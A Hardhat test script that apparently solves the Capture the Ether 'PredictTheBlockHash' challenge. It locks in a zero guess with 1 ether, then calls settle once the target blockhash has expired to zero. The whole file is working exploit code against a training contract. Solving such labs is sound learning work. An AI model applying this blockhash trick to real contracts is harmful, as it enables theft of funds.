const { expect } = require("chai");
const { ethers } = require("hardhat");

const CHALLENGE_ADDRESS = "0xA298987732917B780e36eA2cd5d8a5f8AFF30c71";

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
});

it("PredictTheBlockHash_lockin", async function () {
  const chFactory = await ethers.getContractFactory(
    "PredictTheBlockHashChallenge"
  );
  var contract = await chFactory.attach(CHALLENGE_ADDRESS);
  var tx = await contract.lockInGuess(ethers.utils.formatBytes32String(0), {
    value: ethers.utils.parseEther("1.0"),
    gasLimit: 3e6,
  });
  console.log("lockin intitiated");
  await tx.wait();
  console.log("lockin completed");
  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.false;
});

it("PredictTheBlockHash after blocks", async function () {
  const chFactory = await ethers.getContractFactory(
    "PredictTheBlockHashChallenge"
  );
  var contract = await chFactory.attach(CHALLENGE_ADDRESS);
  var tx = await contract.settle({ gasLimit: 3e6 });
  console.log("settle intitiated");
  await tx.wait();

  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
  console.log("settle completed");
});
